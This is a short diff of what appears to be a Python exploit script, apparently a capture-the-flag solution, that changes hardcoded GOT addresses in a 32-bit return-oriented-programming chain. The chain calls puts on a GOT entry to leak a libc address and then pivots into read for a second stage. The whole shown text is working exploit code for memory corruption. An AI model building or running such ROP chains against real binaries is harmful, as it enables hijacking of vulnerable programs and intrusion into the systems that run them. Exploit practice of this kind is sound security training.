@@ -14,7 +14,7 @@ def execname(payload):
 ###Useful addr
 puts_plt = 0x8048b90
 read_plt = 0x8048a70
-GOT = 0x8055004
+GOT = 0x8055000
 PLT = 0x8048940
 SYMTAB = 0x80481dc
 STRTAB = 0x80484fc
@@ -39,7 +39,7 @@ setname(p32(add_esp_0x1c))
 
 ROPchain  = p32(puts_plt)
 ROPchain += p32(popx1)
-ROPchain += p32(GOT)
+ROPchain += p32(GOT+0x4)
 ROPchain += p32(pop_ebp)
 ROPchain += p32(name_buf-0x4)
 ROPchain += p32(read_plt)
